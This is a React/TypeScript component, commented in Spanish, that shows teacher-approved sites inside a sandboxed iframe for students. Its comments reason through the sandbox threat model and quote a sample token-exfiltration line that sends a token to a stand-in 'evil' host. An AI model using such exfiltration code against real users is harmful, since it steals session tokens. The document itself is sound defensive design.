"use client";

import { useEffect, useRef, useState } from "react";
import { Badge } from "@/shared/components/Badge";
import { Boton } from "@/shared/components/Boton";
import { IconoModo } from "@/shared/components/IconoModo";
import { MensajeEstado } from "@/shared/components/MensajeEstado";
import { hostnameDe } from "@/shared/lib/url";
import type { WhitelistUrl } from "@/shared/types/sesiones";

// Heurística, no detección exacta — y ya sabíamos que era floja (muchos
// bloqueos por X-Frame-Options/CSP igual disparan `onLoad`, el navegador
// "cargó" un frame vacío/de error). Probando con el campus virtual real de
// la institución piloto (Moodle, muchos assets) encontramos que además
// genera falsos positivos: tardó entre 20 y 22s en completar su `load`
// event según la corrida, y con un timeout corto se mostraba "no se puede
// mostrar" sobre el recurso que más necesitan los alumnos, que en realidad
// cargaba perfecto. Dado que esta heurística ya no sirve para detectar
// bloqueos de forma confiable, se la deja de tratar como eso: es solo una
// red de seguridad ante una conexión realmente muerta, no un detector —
// mejor que el alumno espere de más a que se le diga, de forma incorrecta,
// que algo no funciona.
const TIMEOUT_CARGA_MS = 60000;

// Mismo criterio que el de modo directo (ver arriba): acá ni siquiera hay
// posibilidad real de bloqueo (el iframe apunta a nuestro propio origen),
// así que este timeout también es pura red de seguridad, no un detector.
const TIMEOUT_MIRROR_MS = 60000;

interface VisorEmbebidoProps {
  item: WhitelistUrl;
  // URL real que carga el iframe — para modo "mirror" es nuestro propio
  // endpoint /mirror, no item.url directo (ver AlumnoView). El hostname
  // mostrado en la barra sigue siendo el del sitio original (item.url).
  src: string;
  onVolver: () => void;
}

export function VisorEmbebido({ item, src, onVolver }: VisorEmbebidoProps) {
  const [cargada, setCargada] = useState(false);
  const [fallo, setFallo] = useState(false);
  const timerRef = useRef<ReturnType<typeof setTimeout> | undefined>(undefined);

  // El padre monta este componente con `key={item.id}` (ver AlumnoView), así
  // que cada URL nueva es un montaje nuevo: no hace falta resetear
  // `cargada`/`fallo` a mano, arrancan limpios solos.
  useEffect(() => {
    const timeout = item.modo === "directo" ? TIMEOUT_CARGA_MS : TIMEOUT_MIRROR_MS;
    timerRef.current = setTimeout(() => setFallo(true), timeout);
    return () => clearTimeout(timerRef.current);
  }, [item.modo]);

  function manejarCarga(): void {
    clearTimeout(timerRef.current);
    setCargada(true);
  }

  const bloqueado = fallo && !cargada;

  return (
    <div className="flex min-h-0 flex-1 flex-col gap-2">
      <div className="flex items-center justify-between gap-3 rounded-lg border border-carbon/10 bg-arena px-3 py-2">
        <div className="flex min-w-0 items-center gap-2">
          <IconoModo modo={item.modo} className="size-4 shrink-0 text-carbon/50" />
          <span className="truncate text-sm font-medium text-carbon">{hostnameDe(item.url)}</span>
          {item.modo === "mirror" && <Badge variante="celeste">Lectura</Badge>}
          {item.modo === "proxy_general" && <Badge variante="verde">Bloqueo real</Badge>}
        </div>
        <Boton variante="sutil" onClick={onVolver} className="shrink-0">
          Volver
        </Boton>
      </div>

      {bloqueado ? (
        <div className="flex flex-1 flex-col items-center justify-center gap-4 rounded-lg border border-carbon/10 bg-arena p-6 text-center">
          <MensajeEstado tipo="error">
            {item.modo === "mirror"
              ? "No se pudo cargar la versión de lectura. Probá de nuevo en un momento."
              : item.modo === "proxy_general"
                ? "No se pudo cargar este sitio en modo seguro. Probá de nuevo en un momento."
                : "Este sitio no se puede mostrar acá. Puede que no permita abrirse dentro del ENS."}
          </MensajeEstado>
          <Boton onClick={onVolver}>Volver a la lista</Boton>
        </div>
      ) : (
        <div className="relative min-h-0 flex-1">
          {!cargada && (
            <div className="absolute inset-0 z-10 flex items-center justify-center rounded-lg border border-carbon/10 bg-arena">
              <MensajeEstado tipo="cargando">Cargando...</MensajeEstado>
            </div>
          )}
          <iframe
            key={item.id}
            src={src}
            onLoad={manejarCarga}
            title={hostnameDe(item.url)}
            className="h-full min-h-[75vh] w-full rounded-lg border border-carbon/10 bg-white"
            // Antes sin sandbox (capacidades totales). Hoy hay tres modos,
            // cada uno con su propio nivel de confianza y su propio sandbox:
            //
            // - "mirror": HTML que generamos nosotros (sin scripts, ver
            //   lecturaArticulo.ts) — no necesita ninguna capacidad, se
            //   deniega todo con sandbox="" (OJO: sandbox={undefined} NO
            //   hace esto — React omite el atributo entero, y un <iframe>
            //   SIN atributo sandbox corre SIN ninguna restricción; es lo
            //   opuesto de lo que parece. El valor tiene que estar presente,
            //   aunque sea vacío).
            // - "directo": un sitio curado por el docente que sí necesita
            //   ejecutarse entero (YouTube, Forms, Maps) — se le da lo
            //   mínimo para funcionar, nunca acceso a hardware (cámara/mic/
            //   ubicación: fuera de alcance del proyecto, ver Limitaciones
            //   del anteproyecto). allow-scripts + allow-same-origin juntos
            //   es un combo conocido por permitirle a una página sacarse su
            //   propio sandbox — pero sin los dos juntos los embeds reales
            //   (YouTube, Docs) no funcionan (verificado). Para "directo" ya
            //   se confía en la URL por venir de un docente autenticado
            //   (mismo modelo de confianza que el resto de la whitelist).
            // - "proxy_general": HTML de un tercero no confiable (igual que
            //   "mirror"), pero reescrito para servirse desde nuestro origen
            //   con su JS/CSS real intacto (ver reescritorHtml.ts) — por eso
            //   SÍ necesita allow-scripts, a diferencia de "mirror". Lo que
            //   NO lleva, a propósito, es allow-same-origin: ese permiso
            //   junto con allow-scripts haría que el documento framed cuente
            //   como si estuviera genuinamente en nuestro origen, y el `src`
            //   del iframe lleva el token del alumno en la URL (igual que
            //   "mirror", ver AlumnoView) — cualquier script de un tercero
            //   que corra ahí (ads, analytics, un recurso cargado vía
            //   /mirror/recurso) podría entonces llamar a la API real del
            //   backend autenticado como ese alumno, sin que el navegador
            //   aplique CORS. Con el origen opaco (sin allow-same-origin),
            //   ese fetch/XHR de vuelta a nuestro dominio real falla como
            //   cross-origin — el backend no manda headers CORS que lo
            //   permitan. Tampoco lleva allow-forms: el CSP que manda el
            //   backend para /mirror/pagina ya incluye form-action 'none',
            //   así que esa capacidad no haría nada real. (Esto no tapa el
            //   hueco ya aceptado de que un script igual podría navegar a
            //   `location = 'https://evil/?t=' + token` para exfiltrar el
            //   token — ver el resto del plan de RF-04 — solo cierra la
            //   capacidad nueva que introducía este sandbox: llamadas
            //   autenticadas de vuelta a nuestra propia API.)
            sandbox={
              item.modo === "directo"
                ? "allow-scripts allow-same-origin allow-popups allow-forms allow-popups-to-escape-sandbox allow-presentation"
                : item.modo === "proxy_general"
                  ? "allow-scripts"
                  : ""
            }
            allow={item.modo === "directo" ? "fullscreen; clipboard-write; picture-in-picture" : undefined}
          />
        </div>
      )}
    </div>
  );
}
